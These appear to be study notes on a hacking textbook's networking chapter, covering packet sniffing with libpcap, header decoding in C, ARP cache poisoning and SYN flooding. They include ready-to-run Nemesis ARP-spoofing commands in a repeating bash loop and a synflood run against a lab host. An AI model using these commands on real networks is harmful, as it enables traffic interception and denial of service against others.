+pcap_lookupdev() -> function that looks for a suitable device to sniff on. This device is returned as a string pointer referencing static function memory. 
+
+For our system, this will always be /dev/eth0, although it will be different on a BSD system. Function returns NULL if it can't find a suitable interface. 
+
+pcap_open_live() -> function that opens a packet-capturing device, returning a handle to it. Arguments are device to sniff, the max packet size, a promiscuous flag, a timeout value, and a pointer to the error buffer. Since we want to capture in promiscuous mode, the promiscuous flag is set to 1.
+
+Finally, packet capture loop uses pcap_next()
+
+pcap_next() -> function used to grab the next packet. Is passed the pcap_handle and a pointer to a pcap_pkthdr structure so it can fill it with details of the capture. Function returns a pointer to the packet and then prints the packet, getting the length from the capture header. 
+
+pcap_close() -> closes the capture interface.
+
+When this program is compiled, the pcap libraries must be linked. 
+
+This can be done using the -l flag with GCC.
+
+If pcap library is installed on system, the library and include files should be in standard locations the compiler knows about
+
+gcc -o pcap_sniff pcap_sniff.c -l pcap
+
+Notice output in pg 229
+
+There are many bytes preceding the sample text in the packet and many of these bytes are similar. 
+
+Since these are raw packet captures, most of these bytes are layers of header information for Ethernet, IP, and TCP
+
+DECODING THE LAYERS
+
+In these packet captures, the outermost layer is Ethernet, which is also lowest visible layer. Layer is used to send data between Ethernet endpoints with MAC addresses. The header contains the source MAC address, the destination MAC address, and a 16 bit value that describes the type of Ethernet packet. 
+
+On Linux, the structure of this header is defined in /usr/include/linux/if_ethernet.h
+
+The structures for the IP hedaer and TCP header are located in /use/include/netinet/ip.h and /usr/include/netinet/tcp.h respecitively. 
+
+The source code for tcpdump also has structures for these headers, or we could create our own header structures based on the RFC. 
+
+First lets look at existing definition
+
+/usr/include/if_ether.h
+
+#define ETH_ALEN 6 /* Octets in one ethernet addr */
+#define ETH_HLEN 14 /* Total octets in header */ 
+
+/*
+* This is an Ethernet frame header.
+*/
+
+struct ethhdr {
+unsigned char h_dest[ETH_ALEN]; /* Destination eth addr */
+unsigned char h_source[ETH_ALEN]; /* Source ether addr */
+__be16 h_proto; /* Packet type ID field */
+} __attribute__((packed));
+
+This structure contains three elements of an Ethernet header.
+
+Variable declaration of __be16 turns out to be a type definition for a 16bit unsigned short integer.
+
+Can be determined by recursively grepping for type definition in the include files
+
+reader@hacking:~/booksrc $
+$ grep -R "typedef.*__be16" /usr/include
+/usr/include/linux/types.h:typedef __u16 __bitwise __be16;
+$ grep -R "typedef.*__u16" /usr/include | grep short
+/usr/include/linux/i2o-dev.h:typedef unsigned short __u16;
+/usr/include/linux/cramfs_fs.h:typedef unsigned short __u16;
+/usr/include/asm/types.h:typedef unsigned short __u16;
+$
+
+Include file also defined the Ethernet header length in ETH_HLEN as 14 bytes. 
+
+This adds up since sources and destination MAC addresses use 6 bytes each and the packet type field in a 16bit short int that takes up 2 bytes.
+
+HOWEVER, many compilers pad structures along 4 bytes boundaries for alignment, which means taht sizeof(struct ethhdr) would return an incorrect size. To avoid this, ETH_HLEN or 14 byte sshould be used for Ethernet header length
+
+By including <linux/if_ehter.h>, these other inclue files containing the required __be16 type def are also included. 
+
+For our own, we can make better names
+
+#define ETHER_ADDR_LEN 6
+#define ETHER_HDR_LEN 14
+struct ether_hdr {
+unsigned char ether_dest_addr[ETHER_ADDR_LEN]; // Destination MAC address
+unsigned char ether_src_addr[ETHER_ADDR_LEN]; // Source MAC address
+unsigned short ether_type; // Type of Ethernet packet
+};
+
+Can do the same thing with IP and TCP structures
+
+/usr/include/netinet/ip.h
+
+struct iphdr
+{
+	#if __BYTE_ORDER == __LITTLE_ENDIAN
+		unsigned int ihl:4;
+		unsigned int version:4;
+	#elif __BYTE_ORDER == __BIG_ENDIAN
+		unsigned int version:4;
+		unsigned int ihl:4;
+	#else
+	# error "Please fix <bits/endian.h>"
+	#endif
+	u_int8_t tos;
+	u_int16_t tot_len;
+	u_int16_t id;
+	u_int16_t frag_off;
+	u_int8_t ttl;
+	u_int8_t protocol;
+	u_int16_t check;
+	u_int32_t saddr;
+	u_int32_t daddr;
+	/*The options start here. */
+};
+
+Compare with RFC spec.
+
+Each element corresponds to fields shown in RFC header diagram
+
+Since first two fields, Version and IHL (Internet Header Length) are only four bits ins size and there aren't any 4bit variable types in C, the Linux header definition splits the byte differently depending on byte order of the ost.
+
+These fields are in network byte order, so if host is little endian, the IHL should come before Version since byte order is reversed. 
+
+For our purposes, we won't really be using either of these fields. So no need to split up the byte
+
+struct ip_hdr {
+unsigned char ip_version_and_header_length; // Version and header length
+unsigned char ip_tos;
+// Type of service
+unsigned short ip_len;
+// Total length
+unsigned short ip_id;
+// Identification number
+unsigned short ip_frag_offset; // Fragment offset and flags
+unsigned char ip_ttl;
+// Time to live
+unsigned char ip_type;
+// Protocol type
+unsigned short ip_checksum;
+// Checksum
+unsigned int ip_src_addr;
+// Source IP address
+unsigned int ip_dest_addr;
+// Destination IP address
+};
+
+The compiler padding will align this structure on a 4 byte boundary by padding the rest of the structure. IP headers are always 20 bytes. 
+
+For TCP packet header, reference RFC 793
+
+/usr/include/netinet/tcp.h
+
+typedef u_int32_t tcp_seq;
+/*
+* TCP header.
+* Per RFC 793, September, 1981.
+*/
+struct tcphdr
+{
+u_int16_t th_sport; /* source port */
+u_int16_t th_dport; /* destination port */
+tcp_seq th_seq;
+/* sequence number */
+tcp_seq th_ack;
+/* acknowledgment number */
+# if __BYTE_ORDER == __LITTLE_ENDIAN
+u_int8_t th_x2:4;
+/* (unused) */
+u_int8_t th_off:4;
+/* data offset */
+# endif
+# if __BYTE_ORDER == __BIG_ENDIAN
+u_int8_t th_off:4;
+/* data offset */
+u_int8_t th_x2:4;
+/* (unused) */
+# endif
+u_int8_t th_flags;
+# define TH_FIN 0x01
+# define TH_SYN 0x02
+# define TH_RST 0x04
+# define TH_PUSH 0x08
+# define TH_ACK 0x10
+# define TH_URG 0x20
+u_int16_t th_win;
+/* window */
+u_int16_t th_sum;
+/* checksum */
+u_int16_t th_urp;
+/* urgent pointer */
+};
+
+Linux's tcphdr structure also switches the ordering of the 4 bit data offset field and the 4 bit section of the reserved field depending on the host's byte order. 
+
+The data offset field is important since it tells the size of the variable-length TCP hedaer. 
+
+Migh have noticed Linux's tcphdr structure doesn't save space for TCP options. This is bceuase the RFC defines this field as optional. 
+
+The size of the TCP header will always be 32bit aligned, and the data offset tells us how many 32 bit words are in the header. 
+
+So the TTCP header size in bytes equals the data offset field from the header times four. 
+
+Since data offset field is rquired to calculat eheader size, we'll split the byte containing it, assuming little-endian host byte ordering
+
+The th_flags field of Linux's tcphdr structure is defined as an 8bit unsigned character. The values defined below this field are the bitmasks that correspond to the 6 possible flags. 
+
+Customer TCP header
+
+struct tcp_hdr {
+unsigned short tcp_src_port;	// Source TCP port
+unsigned short tcp_dest_port;	// Destination TCP port
+unsigned int tcp_seq;			// TCP sequence number
+unsigned int tcp_ack;			// TCP acknowledgement number
+unsigned char reserved:4;		// 4 bits from the 6 bits of reserved space
+unsigned char tcp_offset:4;		// TCP data offset for little-endian host
+unsigned char tcp_flags;		// TCP flags (and 2 bits of reserved space)
+#define TCP_FIN	0x01
+#define TCP_SYN	0x02
+#define TCP_RST	0x04
+#define TCP_PUSH 0x08
+#define TCP_ACK	0x10
+#define TCP_URG	0x20
+unsigned short tcp_window;		// TCP window size
+unsigned short tcp_checksum;	// TCP checksum
+unsigned short tcp_urgent;		// TCP urgent pointer
+};
+
+
+Now that headers are defined as structures, we can write a program to decode the layered headers of each packet. 
+
+But before we do, let's talk about libpcap. 
+
+pcap_loop() -> pcap function which is a better way to capture packets than just looping on a pcap_next() call
+
+Very few functions actually use pcap_next() because its clumsy and inefficient. 
+
+The pcap_loop() function uses a callback function. Means the pcap_loop() function is passed a function pointer, which is called every time a packet is captured. 
+
+int pcap_loop(pcap_t *handle, int count, pcap_handler callback, u_char *args);
+
+The first argument is the pcap's handle, the next one is a count of how many packets to capture, the hird is a function pointer to the callback function. If the counts argument is set to -1, it will loop until the program breaks out of it. The final argument is an optional pointer that will get passed to the callback function.
+
+Naturally, the callback function needs to follow a certain prototype since pcal_loop must call this function. 
+
+Callback function can have any name, but arguments must be:
+
+void callback(u_char *args, const struct pcap_pkthdr *cap_header, const u_char *packet);
+
+First argument is just optional argument pointe from the last argument to pcap_loop(). Can be used to pass additional information to the callback function, but we aren't going to be using this. NExt two arguments should be familiar from pcap_next(): a  pointer to the capture header and a pointer to the packet itself.
+
+Following example of pcap_loop()
+
+decode_sniff.c
+
+#include <pcap.h>
+#include "hacking.h"
+#include "hacking-network.h"
+void pcap_fatal(const char *, const char *);
+void decode_ethernet(const u_char *);
+void decode_ip(const u_char *);
+u_int decode_tcp(const u_char *);
+void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);
+int main() {
+struct pcap_pkthdr cap_header;
+const u_char *packet, *pkt_data;
+char errbuf[PCAP_ERRBUF_SIZE];
+char *device;
+pcap_t *pcap_handle;
+device = pcap_lookupdev(errbuf);
+if(device == NULL)
+pcap_fatal("pcap_lookupdev", errbuf);
+printf("Sniffing on device %s\n", device);
+pcap_handle = pcap_open_live(device, 4096, 1, 0, errbuf);
+if(pcap_handle == NULL)
+pcap_fatal("pcap_open_live", errbuf);
+pcap_loop(pcap_handle, 3, caught_packet, NULL);
+pcap_close(pcap_handle);
+}
+
+At beginning of program, the prototype for the callback function, called caught_packet(), is declared along with several decoding functions. 
+
+Everything else in main() is bsaically same, except that the for loop has been replaced with a single call to pcap_loop(). Function is passed the pcap_handle, told to capture three packets, and pointed  to the callback function, caught_packet(). Final argument is NULL since we don't have any additional data to pass along to caught_packet(). Also notice the decode_tcp() function returns a u_int. Since TCP header length is variable, this function returns the length of TCP header.
+
+The caught_packet() functions gets called whenever pcap_loop() captures a packet. Function uses the header lengths to split the packet up by layers and the decoding functions to print out details of each layer's header. 
+
+Each type of header has its own decoding functions
+
+void decode_ethernet(const u_char *header_start) {
+int i;
+const struct ether_hdr *ethernet_header;
+ethernet_header = (const struct ether_hdr *)header_start;
+printf("[[ Layer 2 :: Ethernet Header ]]\n");
+printf("[ Source: %02x", ethernet_header->ether_src_addr[0]);
+for(i=1; i < ETHER_ADDR_LEN; i++)
+printf(":%02x", ethernet_header->ether_src_addr[i]);
+printf("\tDest: %02x", ethernet_header->ether_dest_addr[0]);
+for(i=1; i < ETHER_ADDR_LEN; i++)
+printf(":%02x", ethernet_header->ether_dest_addr[i]);
+printf("\tType: %hu ]\n", ethernet_header->ether_type);
+}
+void decode_ip(const u_char *header_start) {
+const struct ip_hdr *ip_header;
+ip_header = (const struct ip_hdr *)header_start;
+printf("\t(( Layer 3 ::: IP Header ))\n");
+printf("\t( Source: %s\t", inet_ntoa(ip_header->ip_src_addr));
+printf("Dest: %s )\n", inet_ntoa(ip_header->ip_dest_addr));
+printf("\t( Type: %u\t", (u_int) ip_header->ip_type);
+printf("ID: %hu\tLength: %hu )\n", ntohs(ip_header->ip_id), ntohs(ip_header->ip_len));
+}
+u_int decode_tcp(const u_char *header_start) {
+u_int header_size;
+const struct tcp_hdr *tcp_header;
+tcp_header = (const struct tcp_hdr *)header_start;
+header_size = 4 * tcp_header->tcp_offset;
+printf("\t\t{{ Layer 4 :::: TCP Header }}\n");
+printf("\t\t{ Src Port: %hu\t", ntohs(tcp_header->tcp_src_port));
+printf("Dest Port: %hu }\n", ntohs(tcp_header->tcp_dest_port));
+printf("\t\t{ Seq #: %u\t", ntohl(tcp_header->tcp_seq));
+printf("Ack #: %u }\n", ntohl(tcp_header->tcp_ack));
+printf("\t\t{ Header Size: %u\tFlags: ", header_size);
+if(tcp_header->tcp_flags & TCP_FIN)
+printf("FIN ");
+if(tcp_header->tcp_flags & TCP_SYN)
+printf("SYN ");
+if(tcp_header->tcp_flags & TCP_RST)
+printf("RST ");
+if(tcp_header->tcp_flags & TCP_PUSH)
+printf("PUSH ");
+if(tcp_header->tcp_flags & TCP_ACK)
+printf("ACK ");
+if(tcp_header->tcp_flags & TCP_URG)
+printf("URG ");
+printf(" }\n");
+return header_size;
+}
+
+The decoding functions are passed a point to the start of the header, which is typecast to the appropriate structure. This allows accessing various fields of the header, but it's important to remember these values will be in network byte order.
+
+This data is straight from the wire so the byte order needs to be converted for use on an x86 processor.
+
+reader@hacking:~/booksrc $ gcc -o decode_sniff decode_sniff.c -lpcap
+reader@hacking:~/booksrc $ sudo ./decode_sniff
+Sniffing on device eth0
+==== Got a 75 byte packet ====
+[[ Layer 2 :: Ethernet Header ]]
+[ Source: 00:01:29:15:65:b6
+Dest: 00:01:6c:eb:1d:50 Type: 8 ]
+(( Layer 3 ::: IP Header ))
+( Source: 192.168.42.1 Dest: 192.168.42.249 )
+( Type: 6
+ID: 7755
+Length: 61 )
+{{ Layer 4 :::: TCP Header }}
+{ Src Port: 35602
+Dest Port: 7890 }
+{ Seq #: 2887045274
+Ack #: 3843058889 }
+{ Header Size: 32
+Flags: PUSH ACK }
+9 bytes of packet data
+74 65 73 74 69 6e 67 0d 0a
+| testing..
+==== Got a 66 byte packet ====
+[[ Layer 2 :: Ethernet Header ]]
+[ Source: 00:01:6c:eb:1d:50
+Dest: 00:01:29:15:65:b6 Type: 8 ]
+(( Layer 3 ::: IP Header ))
+( Source: 192.168.42.249
+Dest: 192.168.42.1 )
+( Type: 6
+ID: 15678
+Length: 52 )
+{{ Layer 4 :::: TCP Header }}
+{ Src Port: 7890
+Dest Port: 35602 }
+{ Seq #: 3843058889
+Ack #: 2887045283 }
+{ Header Size: 32
+Flags: ACK }
+No Packet Data
+==== Got a 82 byte packet ====
+[[ Layer 2 :: Ethernet Header ]]
+[ Source: 00:01:29:15:65:b6
+Dest: 00:01:6c:eb:1d:50 Type: 8 ]
+(( Layer 3 ::: IP Header ))
+( Source: 192.168.42.1 Dest: 192.168.42.249 )
+( Type: 6
+ID: 7756
+Length: 68 )
+{{ Layer 4 :::: TCP Header }}
+{ Src Port: 35602
+Dest Port: 7890 }
+{ Seq #: 2887045283
+Ack #: 3843058889 }
+{ Header Size: 32
+Flags: PUSH ACK }
+16 bytes of packet data
+74 68 69 73 20 69 73 20 61 20 74 65 73 74 0d 0a | this is a test..
+reader@hacking:~/booksrc $
+
+With headers decoded and separated into layers, the TCP/IP connectoin is much easier to understand.
+
+Notice which IP addresses are associated with which MAC address. Also notice how the sequence number in the two packets from 192.168.42.1 (the first and last packet) increases by nine, since the first packet contained nine bytes of actual data: 2887045283 – 2887045274 = 9. This is used by TCP protocol to make sure all of the data arrives in order, since packets could be delayed for various reasons
+
+Despite all the mechanisms built into the packet headers, the packets are still visible to anyone on the same network segment. Protocols such as FTP, POP3, and telnet trasnmit data without encryption. 
+
+Even without assistance of a toll like dsniff, it's fairly trivial for an attacker sniffing the network to find the usernames and apsswords in these packets nad use them to compromise other systems. 
+
+From a security perspecitive, this isn't too good, so more intelligent switches provide switched network environments
+
+ACTIVE SNIFFING
+
+switched network environment -> packets are only sent to the port they are destined for, according to their destination MAC addresses. Requires more intelligent hardware that can create and maintain a table associating MAC addresses with certain ports, depending on which device is ocnnected to each port
+
+Advantage of a switched environment is that devices are only sent packets that are meant for them, so that promiscuous devices aren't able to sniff any additional packets. 
+
+But even in a switched environment, there are clever ways to sniff other devices' packets; they just tend to be a bit more complex. 
+
+In order to find these hacks, the details of the protocols must be examined and then combined
+
+One important aspect of network communications that can be manipulated for interesting effects is the source address. There's no provision in these protocols to ensure that the source address in a packet really is the address of the source machine
+
+Spoofing -> the act of forging a source address in a packet. 
+
+Spoofing greatly increases the number of possible hacks, since most systems expect the source address to be valid
+
+Spoofing is first step in sniffing packets on a switched network. 
+
+Other two intersting details are found in ARP.
+
+First, when an ARP reply comes in with an IP address that already exists in the ARP cache, the receiving system will overwrite the prior MAC address information with the new information found in the reply (unless that entry in the ARP cache was explicitly marked as permanent). 
+
+Second, no state information about the ARP traffic is kept, since this would require additional memory and would complicate a protocol that is meant to be simple. 
+
+This means systems will accept an ARP reply even if they didn't send out an ARP request. 
+
+These three details, when exploited properly, allow an attacker to sniff network traffic on a switched network using a technique known as *ARP redirection*.
+
+ARP redirection -> attacker sends spoofed ARP replies to certain devices that cause the ARP cache entries to be overwritten with the attacker's data. This technique is called *ARP cache poisoning*. 
+
+In order to sniff network traffic between two points, A and B, the attacker needs to poison the ARp cache of A to cause A to believe that B's IP address is at the attacker's MAC address, and also poison the ARp cache of B to cause B to believe that A's IP address is also at the attacker's MAC address. Then the attacker's machine simple needs to forward these packets to their appropriate final destinations. After that, all of the traffic between A and B still gets delivered, but it all flows through the attacker's machine, as shown here.
+
+Pg. 240
+
+Since A and B are wrapping their own Ethernet headers on their packets based on their respective ARP caches, A's IP traffic meant for B is actually sent to the attacker's MAC address and vice versa. 
+
+The switch only filters traffic based on MAC address, so the switch will work as it's designed to, sending A's and B's IP traffic, destined for the attacker's MAC address, to the attacker's port. Then the attacker rewraps the IP packets with the proper EThernet headers and sends them back to the switch, where they are finally routed to their proper destination. 
+
+The switch works properly, it's the victim machines that are tricked into redirecting their traffic through the attacker's machine.
+
+Due to timeout values, the vimcim machines will periodically send out real ARP requests and receive real ARP replies in response. 
+
+In order to maintain the redirection attack, the attacker must keep the victim machine's ARP caches poisoned. 
+
+A simple way to accomplish this is to send spoofed ARP replies to both A and B at a constant interval (ex. every 10 seconds)
+
+Gateway -> a system that routes all the traffic from a local nework out to the Internet.
+
+ARP redirection is particularly interesting when one of the victim machines is the default gateway, since the traffic between the default gateway and another system is that system's Internet traffic. 
+
+For example, if a machine at 192.168.0.118 is communicating with the gateway at 192.168.0.1 over a switch, the traffic will be restricted by MAC address. This means that this traffic cannot normally be sniffed, even in promiscuous mode.
+
+In order to sniff this traffic, it must be redirected
+
+To redirect the traffic, first the MAC addresse of 192.168.0.118 and 192.168.0.1 need to be determined. This can be done by pinging these hosts, since any IP connection attempt will use ARP. If you run a sniffer, you can see the ARP communications, but the OS will cache the resulting IP/MAC address associations.
+
+reader@hacking:~/booksrc $ ping -c 1 -w 1 192.168.0.1
+PING 192.168.0.1 (192.168.0.1): 56 octets data
+64 octets from 192.168.0.1: icmp_seq=0 ttl=64 time=0.4 ms
+--- 192.168.0.1 ping statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 0.4/0.4/0.4 ms
+reader@hacking:~/booksrc $ ping -c 1 -w 1 192.168.0.118
+PING 192.168.0.118 (192.168.0.118): 56 octets data
+64 octets from 192.168.0.118: icmp_seq=0 ttl=128 time=0.4 ms
+--- 192.168.0.118 ping statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 0.4/0.4/0.4 ms
+reader@hacking:~/booksrc $ arp -na
+? (192.168.0.1) at 00:50:18:00:0F:01 [ether] on eth0
+? (192.168.0.118) at 00:C0:F0:79:3D:30 [ether] on eth0
+reader@hacking:~/booksrc $ ifconfig eth0
+eth0	Link encap:Ethernet HWaddr 00:00:AD:D1:C7:ED
+		inet addr:192.168.0.193 Bcast:192.168.0.255 Mask:255.255.255.0
+		UP BROADCAST NOTRAILERS RUNNING MTU:1500 Metric:1
+		RX packets:4153 errors:0 dropped:0 overruns:0 frame:0
+		TX packets:3875 errors:0 dropped:0 overruns:0 carrier:0
+		collisions:0 txqueuelen:100
+		RX bytes:601686 (587.5 Kb) TX bytes:288567 (281.8 Kb)
+		Interrupt:9 Base address:0xc000
+reader@hacking:~/booksrc $
+
+After pinging, the MAC address for both 192.168.0.118 and 192.168.0.1 are in the attacker's ARP cache. 
+
+This way packets can reach their final destinations after being redirected to the attacker's machine. 
+
+Assuming IP forwarding capabilities are compiled into the kernel, all we need to do is send some spoofed ARp replies at regular intervals. 
+
+192.168.0.118 needs to be told that 192.168.0.1 is at 00:00:AD:D1:C7:ED and 192.168.0.1 needs to be told that 192.168.0.118 is also at 00:00:AD:D1:C7:ED. 
+
+These spoofed ARP packets can be injected using a command-line packet injection tool called Nemesis
+
+Nemesis -> command line packet injection tool. Originally a suite of tools, but all functionality was roled up into a single utility in version 1.4. 
+
+Source code on live cd is at /usr/src/nemesis-1.4/ and it has already been built and installed
+
+reader@hacking:~/booksrc $ nemesis
+
+reader@hacking:~/booksrc $ sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D
+192.168.0.118 -h 00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -
+M 00:C0:F0:79:3D:30
+
+reader@hacking:~/booksrc $ sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D
+192.168.0.1 -h 00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M
+00:50:18:00:0F:01
+
+These two commands spoof ARP replies from 192.168.0.1 to 192.168.0.118 and vice versa, both claiming that their MAC address is at the attacker's MAC address of 00:00:AD:D1:C7:ED. 
+
+If these commands are repeated every 10 seconds, thses bogus ARp replies will continue to keep the ARP caches poisoned and the traffic redirected. 
+
+Can create a shell script.
+
+reader@hacking:~/booksrc $ while true
+> do
+> sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D 192.168.0.118 -h
+00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -M
+00:C0:F0:79:3D:30
+> sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D 192.168.0.1 -h
+00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M
+00:50:18:00:0F:01
+> echo "Redirecting..."
+> sleep 10
+> done
+
+Something as simple as Nemesis and standard BASH can be used to quick;y hack together a network exploit. 
+
+Nemesis uses a C library called lbnet to craft spoofed packets and inject them. Simlar to libpcap, this library uses raw sockets and evens out the inconsistencies between platforms with a standardized interface. libnet also provides several convenient functions for dealing with network packets, such as checksum generation.
+
+libnet provides a simple and uniform API to craft and inject network packets. 
+
+High level glance at source code for Nemesis shows how easy it is to craft ARP packets using libnet. 
+
+nemesisarp.c -> contains several functions for crafting and injecting ARP packets, using statically defined data structures for the packet header information. The nemesis_arp() function shown below is called in nemsis.c to build and inject an ARP packet. 
+
+static ETHERhdr etherhdr;
+static ARPhdr arphdr;
+
+arp_initdata();
+arp_cmdline(argc, argv);
+arp_validatedata();
+arp_verbose();
+
+buildarp(&etherhdr, &arphdr, &pd, device, reply)
+arp_exit(1);
+
+The structures ETHERhdr and ARPhdr are defined in the file nemesis.h a saliases for existing libnet data structures. 
+
+Can probably guess these functions initialize data, process command line arguments, validate data, and do some sort of verbose reporting. 
+
+arp_initdata() -> initalizes values in statically declared data structures. Sets various leements of the ehader structures to the appropriate values for an ARp packet. 
+
+static void arp_initdata(void)
+{
+/* defaults */
+etherhdr.ether_type = ETHERTYPE_ARP; /* Ethernet type ARP */
+memset(etherhdr.ether_shost, 0, 6); /* Ethernet source address */
+memset(etherhdr.ether_dhost, 0xff, 6); /* Ethernet destination address */
+arphdr.ar_op = ARPOP_REQUEST;
+/* ARP opcode: request */
+arphdr.ar_hrd = ARPHRD_ETHER;
+/* hardware format: Ethernet */
+arphdr.ar_pro = ETHERTYPE_IP;
+/* protocol format: IP */
+arphdr.ar_hln = 6;
+/* 6 byte hardware addresses */
+arphdr.ar_pln = 4;
+/* 4 byte protocol addresses */
+memset(arphdr.ar_sha, 0, 6);
+/* ARP frame sender address */
+memset(arphdr.ar_spa, 0, 4);
+/* ARP sender protocol (IP) addr */
+memset(arphdr.ar_tha, 0, 6);
+/* ARP frame target address */
+memset(arphdr.ar_tpa, 0, 4);
+/* ARP target protocol (IP) addr */
+pd.file_mem = NULL;
+pd.file_s = 0;
+return;
+}
+
+The nemesis_arp() function calls the function buildarp() with pointers to the header data structures. Judging from the way the return value from buildarp() is handled here, buildarp() builds the packet and injects it. 
+
+This function is found in another source file, nemesis-proto_arp.c
+
+pg. 246
+
+Uses libnet functions
+
+libnet_open_link_interfae(device, errbuf)
+
+libnet_init_packet(arp_packetlen, &pkt)
+
+libnet_build_ethernet(eth->ether_dhost, eth->ether_shost, eth->ether_type, NULL, 0, pkt)
+
+libnet_build_arp(arp->ar_hrd, arp->ar_pro, arp->ar_hln, arp->ar_pln, arp->arp_op, arp->ar_sha, arp->ar_spa, arp->ar_tha, arp->ar_tpa, pd->file_mem, pd->file_s, pkt + LIBNET_ETH_H);
+
+n = libnet_write_link_layer(l2, device, pkt, LIBNET_ETH_H + LIBNET_ARP_H + pd->file_s);
+
+libnet_destroy_packet(&pkt)
+
+libnet_close_link_interface(l2);
+
+Using libnet functoins, it opens a link interface and initializes memory for a packet. Then, it builds the Ethernet layer using elements from the Ethernet header data structure and then does the same for the ARP layer. Next it writes the packet to the device to inject it, and finally cleans up by destroying the packet and closing the interface. 
+
+Documentation for these libnet functions can be found in libnet man page
+
+With basic understanding of C, API documentatoin, and common sense, can yeach yourself just by examining open source projects
+
+For example, dsniff includes a program called arpspoof that performs the ARP redirection attack
+
+Magic of this program comes from its arp_send() function, which also uses libnet to spoof packets. i
+
+Remaining libnet functions get hardware addresses, get the IP ddress, and look up hosts. 
+
+libnet_get_hwaddr()
+
+libnet_get_ipaddr()
+
+libnet_host_lookup()
+
+DENIAL OF SERVICE
+
+Denial of Service (DoS) -> one of simplest forms of network attack. Instead of trying to steal information, a DoS attack simply prevents access to a service or resource
+
+Two general forms:
+1. Those that crash services
+2. Those that flood services
+
+Those that crash services are similar to program exploits than network-based exploits. Often they take advantage of a poor implementation by a specific vendor. A buffer overflow exploit gone wrong will usually just crash the target program. However, if program is on a server, then no one else can access that server after it has crashed
+
+Crashing DoS attacks are tied closely to a certain program and a certain version. Since the OS handles the network stack, crashes in this code will take down the kernel, denying service to the entire machine. 
+
+Many of these vulnerabilities have long since ben patched on modern OSes, but it's still useful to think about how these techniques might be applied to different situations
+
+SYN FLOODING
+
+A SYN flood -> tries to exhaust states in the TCP/IP stack. 
+
+Since TCP maintains "reliable" connections, each connection needs to be tracked somewhere. The TCP/IP stack in the kernel handles this, but it has a finite table that can only track so many incoming connections. 
+
+A SYN flood uses spoofing to take advantage of this situation. 
+
+Attacker floods the victim's system with many SYN packets, using a spoofed nonexistent source address. Since SYN packet is used to initiate a TCP connection, the victim's machine will send a SYN/ACK packet to the spoofed address in response and wait for the expected ACK response. Each of these waiting, half-open connections goes into a backlog queue that has limited space. 
+
+Since spoofed source addresses don't actually exist, the ACK responses needed to remove these entries from the queue and complete the connections never come. Instead, each half-open connectoin must time out, which takes a relatively long time.
+
+As long as the attacker continues to flood the victim's sytem with spoofed SYN packets, the victim's backlog queue will remain full, making it nearly impossible for real SYN packets to get to the system and initiate valid TCP/IP connections
+
+Using Nemesis and arpspoof source code as reference, you can write a program that performs this attack. 
+
+Example program uses libnet functions and socket functions. 
+
+libnet_get_prand() -> obtain psuedo-random numbers for various IP fields
+
+libnet_seed_prand() -> seed the randomizer
+
+synflood.c
+
+Current release at time of this book is libnet version 1.1, which is incompatible with libnet 1.0. 
+
+However, Nemesis and arpspoof still rely on the 1.0 ersion of libnet, so this version is included in the LiveCD and is what will be used in synflood program.
+
+Similar to libpcap, when compiling with libnet, the flag -lnet is used. 
+
+Also, libnet has several mandatory flags that need to be set. 
+
+libnet-config will output these flags.
+
+libnet-config --help
+
+reader@hacking:~/booksrc $ libnet-config --help
+Usage: libnet-config [OPTIONS]
+Options:
+[--libs]
+[--cflags]
+[--defines]
+reader@hacking:~/booksrc $ libnet-config --defines
+-D_BSD_SOURCE -D__BSD_SOURCE -D__FAVOR_BSD -DHAVE_NET_ETHERNET_H
+-DLIBNET_LIL_ENDIAN
+
+Can use BASH shell command substitution to dynamically insert these defines into compilation
+
+reader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o synflood
+synflood.c -lnet
+reader@hacking:~/booksrc $ ./synflood
+Usage:
+./synflood
+<target host> <target port>
+reader@hacking:~/booksrc $
+reader@hacking:~/booksrc $ ./synflood 192.168.42.88 22
+Fatal: can't open network interface. -- this program must run as root.
+reader@hacking:~/booksrc $ sudo ./synflood 192.168.42.88 22
+SYN Flooding port 22 of 192.168.42.88..
+
+IN example above, the host 192.168.42.88 is a Windows CP machine running an openssh server on port 22 via cygwin. The tcpdump output below shows the spoofed SYN packets shows the spoofed SYN packets glooding the host from apparently random IPs. While the program is running, legitimate connections cannot be made to this port. 
+
+reader@hacking:~/booksrc $ sudo tcpdump -i eth0 -nl -c 15 "host 192.168.42.88"
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
+17:08:16.334498 IP 121.213.150.59.4584 > 192.168.42.88.22: S
+751659999:751659999(0) win 14609
+17:08:16.346907 IP 158.78.184.110.40565 > 192.168.42.88.22: S
+139725579:139725579(0) win 64357
+17:08:16.358491 IP 53.245.19.50.36638 > 192.168.42.88.22: S
+322318966:322318966(0) win 43747
+17:08:16.370492 IP 91.109.238.11.4814 > 192.168.42.88.22: S
+685911671:685911671(0) win 62957
+17:08:16.382492 IP 52.132.214.97.45099 > 192.168.42.88.22: S
+71363071:71363071(0) win 30490
+17:08:16.394909 IP 120.112.199.34.19452 > 192.168.42.88.22: S
+1420507902:1420507902(0) win 53397
+17:08:16.406491 IP 60.9.221.120.21573 > 192.168.42.88.22: S
+2144342837:2144342837(0) win 10594
+17:08:16.418494 IP 137.101.201.0.54665 > 192.168.42.88.22: S
+1185734766:1185734766(0) win 57243
+17:08:16.430497 IP 188.5.248.61.8409 > 192.168.42.88.22: S
+1825734966:1825734966(0) win 43454
+17:08:16.442911 IP 44.71.67.65.60484 > 192.168.42.88.22: S
+1042470133:1042470133(0) win 7087
+17:08:16.454489 IP 218.66.249.126.27982 > 192.168.42.88.22: S
+1767717206:1767717206(0) win 50156
+17:08:16.466493 IP 131.238.172.7.15390 > 192.168.42.88.22: S
+2127701542:2127701542(0) win 23682
